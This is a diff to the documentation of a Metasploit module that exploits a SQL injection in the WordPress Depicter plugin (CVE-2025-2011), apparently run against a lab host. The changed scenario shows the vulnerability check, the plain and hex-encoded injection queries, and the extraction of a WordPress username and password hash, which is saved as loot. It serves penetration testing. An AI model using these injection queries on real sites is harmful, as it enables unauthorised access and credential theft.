@@ -106,24 +106,31 @@ The module should:
 ## Scenarios
 
 ```bash
-msf6 auxiliary(gather/wp_depicter_sqli_cve_2025_2011) > run http://lab:5555
-[*] Retrieving database name via SQLi...
-[+] Database name: exploit_market
-[*] Enumerating tables for prefix inference...
-[+] Tables: wp_commentmeta,wp_comments,wp_depicter_documents,wp_depicter_lead_fields,wp_depicter_leads,wp_depicter_meta,wp_depicter_options,wp_links,wp_options,wp_postmeta,wp_posts,wp_suretriggers_webhook_requests,wp_term_relationships,wp_term_taxonomy,wp_termmeta,wp_terms,wp_ur_membership_ordermeta,wp_ur_membership_orders,wp_ur_membership_subscriptio
-[*] Inferred users table: wp_users
-[*] Extracting user credentials...
+msf6 auxiliary(gather/wp_depicter_sqli_cve_2025_2011) > exploit
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] {SQLi} Executing (select 'bEJ')
+[*] {SQLi} Encoded to (select 0x62454a)
+[+] The target is vulnerable.
+[*] {SQLi} Executing (SELECT 15 FROM information_schema.tables WHERE table_name = 'wp_users')
+[*] {SQLi} Encoded to (SELECT 15 FROM information_schema.tables WHERE table_name = 0x77705f7573657273)
+[*] {WPSQLi} Retrieved default table prefix: 'wp_'
+[*] {SQLi} Executing (select group_concat(DCdo) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) DCdo from wp_users limit 1) ofAGxxQl)
+[*] {SQLi} Encoded to (select group_concat(DCdo) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0xa,0)),ifnull(user_pass,repeat(0x2,0))) as binary) DCdo from wp_users limit 1) ofAGxxQl)
 [!] No active DB -- Credential data will not be saved!
-[+] Created credential for chocapikk
+[+] {WPSQLi} Credential for user 'chocapikk' created successfully.
+[*] {WPSQLi} Dumped user data:
 wp_users
 ========
 
-    Username   Password Hash
-    --------   -------------
-    chocapikk  $wp$2y$10$rc5oXfNPG.bYSnbYvELKZeGgoQ9.QHcAXG8U/xunfXzsviMQkiPga
+    user_login  user_pass
+    ----------  ---------
+    chocapikk   $wp$2y$10$rc5oXfNPG.bYSnbYvELKZeGgoQ9.QHcAXG8U/xunfXzsviMQkiPga
 
-[+] Loot saved to: /home/chocapikk/.msf4/loot/20250514154441_default_127.0.0.1_wordpress.users_167822.txt
-[+] Reporting completed
+[+] Loot saved to: /home/chocapikk/.msf4/loot/20250521182202_default_127.0.0.1_wordpress.users_171366.txt
+[*] {WPSQLi} Reporting host...
+[*] {WPSQLi} Reporting service...
+[*] {WPSQLi} Reporting vulnerability...
+[+] {WPSQLi} Reporting completed successfully.
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
